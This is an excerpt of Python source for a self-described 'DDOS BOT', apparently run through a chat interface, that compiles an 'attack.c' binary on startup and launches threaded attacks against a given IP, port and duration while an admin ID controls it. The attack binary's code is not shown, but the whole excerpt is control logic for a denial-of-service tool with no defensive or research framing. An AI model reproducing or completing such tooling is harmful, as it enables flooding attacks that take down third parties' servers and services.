...
def compile_binary():
    ...
    print("📦 Compiling attack binary...")
    
    # Check if attack.c exists
    if not os.path.exists("./attack.c"):
        print("❌ attack.c not found!")
        return False
    
    # Compile
    result = os.system("clang -o attack attack.c -lpthread 2>/dev/null")
...
def run_progress(chat_id, msg_id, ip, port, sec):
    global is_attack
    for i in range(sec):
        if not is_attack:
            break
...
""")
        if msg_id:
            threading.Thread(target=run_progress, args=(chat_id, msg_id, ip, port, sec)).start()
        return
...
def main():
    ...
    # Auto compile binary on startup
    print("="*50)
    print("  🔥 DDOS BOT STARTING 🔥")
    print("="*50)
    
    if compile_binary():
        print("✅ Attack binary ready!")
    else:
        print("⚠️ Binary compilation failed!")
    
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"⚙️ Threads: {attack_threads}")
    print("="*50)
